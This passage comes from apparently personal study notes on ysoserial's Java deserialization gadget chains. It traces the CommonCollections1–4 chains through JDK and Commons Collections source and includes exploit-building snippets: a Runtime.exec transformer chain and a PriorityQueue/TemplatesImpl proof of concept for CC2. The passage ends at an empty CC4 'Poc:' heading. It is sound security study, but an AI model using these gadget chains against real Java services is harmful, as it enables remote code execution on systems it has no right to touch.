</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;  </span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)  </span><br><span class="line">            c = queue[child = right];  </span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        ...</span><br><span class="line">    &#125;  </span><br><span class="line">    ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Chains"><a href="#Chains" class="headerlink" title="Chains"></a>Chains</h1><h2 id="CommonCollections"><a href="#CommonCollections" class="headerlink" title="CommonCollections"></a>CommonCollections</h2><h3 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h3><blockquote>
<p>[!NOTE] Pre-requirements<br>JDK &lt; 1.8 (Tested on JDK7u21, fail on JDK1.8)<br>commons-collections:commons-collections:3.1</p>
</blockquote>
<blockquote>
<p>[!NOTE]<br>There are main two variants of CC1, <code>LazyMap</code> or <code>TransformedMap</code></p>
</blockquote>
<h4 id="Using-LazyMap"><a href="#Using-LazyMap" class="headerlink" title="Using LazyMap"></a>Using <code>LazyMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	AnnotationInvocationHandler.readObject()</span><br><span class="line">		Map(Proxy).entrySet()</span><br><span class="line">			AnnotationInvocationHandler.invoke()</span><br><span class="line">				LazyMap.get()</span><br><span class="line">					ChainedTransformer.transform()</span><br><span class="line">						ConstantTransformer.transform()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Class.getMethod()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.getRuntime()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>Use <code>AnnotationInvocationHandler</code> object(handler1) to trigger deserialize method <code>readObject</code>, it contains a dynamic proxy object for <code>Map</code> interface, another <code>AnnotationInvocationHandler</code> object(handler2) is contained in this <code>Proxy</code> object, handler2 contains a <code>LazyMap</code> armed with the evil transformer chain.<br>![[Pasted image 20231008190210.png|700]]</p>
<p>Firstly, when a deserialize procession is started, in handler1’s <code>readObject</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span><br><span class="line">	    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();  </span><br><span class="line">	    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">	    Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">	    <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists  </span></span><br><span class="line">	        value = memberValue.getValue();  </span><br><span class="line">	        <span class="keyword">if</span> (!(memberType.isInstance(value) ||  </span><br><span class="line">	              value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;  </span><br><span class="line">	            value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(  </span><br><span class="line">	                        objectToString(value))  </span><br><span class="line">	                .setMember(annotationType.members().get(name));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Obtain <code>memberValues</code>(which is a <code>Proxy</code>) and call <code>entrySet()</code> on it. The proxy will employ its <code>InvocationHandler</code> member to trigger <code>invoke()</code> method with <em>entrySet</em> method as one of parameters. In handler2’s <code>invoke()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  </span><br><span class="line">	<span class="keyword">if</span> (result == <span class="literal">null</span>)  </span><br><span class="line">	    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As for handler2, <code>memberValues</code> is a <code>LazyMap</code> object with evil transformer chain, when its <code>get</code> is called, since there is no key like <em>entrySet</em> in this empty map, the transformer chain will be triggered as code below presents:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LazyMap.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map  </span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The evil transformer chain is usually presented as:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);  </span><br><span class="line"><span class="comment">// real chain for after setup  </span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;  </span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  </span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;  </span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  </span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, execArgs),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>
<p>End.</p>
<h4 id="Using-TransformedMap"><a href="#Using-TransformedMap" class="headerlink" title="Using TransformedMap"></a>Using <code>TransformedMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">transform:<span class="number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)  </span><br><span class="line">checkSetValue:<span class="number">169</span>, TransformedMap (org.apache.commons.collections.map)  </span><br><span class="line">setValue:<span class="number">191</span>, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)  </span><br><span class="line">readObject:-<span class="number">1</span>, AnnotationInvocationHandler (sun.reflect.annotation)  </span><br><span class="line">readObject:-<span class="number">1</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure>

<p>Look in <code>AnnotationInvocationHandler</code>‘s <code>readObject</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">	<span class="keyword">try</span> &#123;  </span><br><span class="line">	    annotationType = AnnotationType.getInstance(t);  </span><br><span class="line">	&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;  </span><br><span class="line">	    <span class="comment">// Class is no longer an annotation type; time to punch out  </span></span><br><span class="line">	    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  </span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><code>AnnotationType.memberTypes()</code> will return the member name and type of specific annotation type, for <code>Target</code> annotation, its <code>memberTypes()</code> would return :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;value&quot;</span>: class [Ljava.lang.annotation.ElementType;</span><br></pre></td></tr></table></figure>
<p>There are two constraints in code above.</p>
<ol>
<li><code>streamVals</code>(which is a Map) should have an entry whose key exists in <code>annotationType</code>‘s <code>memberTypes</code> Map, for <code>Target</code>, it should be String <em>“value”</em>. Therefore, our <code>TransformedMap</code> should contain key <em>“value”</em>;</li>
<li><code>memberValue</code> should not be the same type as the corresponding value of <code>streamVals</code>, i.e. the value of the entry in <code>TransformedMap</code> should not falls in either <code>java.lang.annotation.ElementType</code> nor <code>ExceptionProxy</code>.<br>Transformer chain would be triggered along with the call to <code>memberValue.setValue()</code></li>
</ol>
<p>Further, look into <code>TransformedMap</code>‘s <code>entrySet</code>(which backtracks to parent <code>AbstractInputCheckedMapDecorator</code>):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (isSetValueChecking()) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySet</span>(map.entrySet(), <span class="built_in">this</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> map.entrySet();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Follow into <code>EntrySet</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EntrySet</span> <span class="keyword">extends</span> <span class="title class_">AbstractSetDecorator</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;  </span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(collection.iterator(), parent);  </span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p>In <code>EntrySetIterator</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EntrySetIterator</span> <span class="keyword">extends</span> <span class="title class_">AbstractIteratorDecorator</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;  </span><br><span class="line">	    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();  </span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, parent);  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In <code>MapEntry</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">	    value = parent.checkSetValue(value);  </span><br><span class="line">	    <span class="keyword">return</span> entry.setValue(value);  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Look into <code>TransformedMap</code>‘s <code>checkSetValue</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As a result, when handler triggers <code>memberValue.setValue()</code>, control falls successively into the code chain above  and eventually trigger <code>transform</code> method.</p>
<p>End.</p>
<h3 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h3><blockquote>
<p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections4:4.0</p>
</blockquote>
<p>The <code>TransformingComparator</code> transforms the objects before comparison.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">	<span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">	<span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PriorityQueue</code> can employ <code>TransformingComparator</code> to sort objects. In <code>readObject()</code> method:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ...</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)  </span><br><span class="line">        siftDown(i, (E) queue[i]);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)  </span><br><span class="line">        siftDownUsingComparator(k, x);  </span><br><span class="line">    <span class="keyword">else</span>        siftDownComparable(k, x);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;  </span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;  </span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)  </span><br><span class="line">            c = queue[child = right];  </span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        ...</span><br><span class="line">    &#125;  </span><br><span class="line">    ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Insert a <code>TemplatesImpl</code> object into priority queue and use an <code>InvokerTranformer</code> configured with <code>newTransformer</code> method to decorate the comparator. While deserialization the queue, the <code>newTransformer</code> method of <code>TemplatesImpl</code> is called and arbitrary code is executed.</p>
<p>Poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line"><span class="comment">// mock method name until armed  </span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator  </span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));  </span><br><span class="line"><span class="comment">// stub data for replacement later  </span></span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// switch method called by comparator  </span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// switch contents of queue  </span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);  </span><br><span class="line">queueArray[<span class="number">0</span>] = templates;  </span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>


<h3 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h3><blockquote>
<p>A variant of CC1, replace <code>InvokerTransformer</code> by <code>InstantiateTransformer</code></p>
</blockquote>
<blockquote>
<p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 7u21, reproduce on jdk7u21<br>commons-collections:commons-collections:3.1</p>
</blockquote>
<p>As [[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|this section]] presents, <code>TemplatesImpl</code>‘s <code>newTransformer</code> exposes an approach to loading arbitrary byte code.</p>
<p>Seek for reference of <code>TemplatesImpl</code>‘s <code>newTransformer</code> method, find in <code>TrAXFilter</code>‘s constructor:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span>  </span><br><span class="line">    TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    _templates = templates;  </span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();  </span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);  </span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Immediately after [[Java Deserialize Vulnerabilities ysoserial study#Proof of Concept|this code section]], proof concept above by code below:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class;  </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Templates.class);  </span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">constructor.newInstance(templates); <span class="comment">// templates is TemplatesImpl type</span></span><br></pre></td></tr></table></figure>

<p>This routine can be translated into the form of transformers, by introducing <code>InstantiateTransformer</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;  </span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )&#125;;</span><br></pre></td></tr></table></figure>

<p>Use whichever payload in [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|CC1]] to reach the eventual payload.</p>
<p>End.</p>
<h3 id="CommonCollections4"><a href="#CommonCollections4" class="headerlink" title="CommonCollections4"></a>CommonCollections4</h3><blockquote>
<p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections:4.0</p>
</blockquote>
<p>This payload uses the same vulnerability as [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|CC2]] but uses a different exploit chain.<br>Specifically, this payload uses <code>TrAXFilter</code>, triggers transformer from its constructor.<br>Poc:</p>
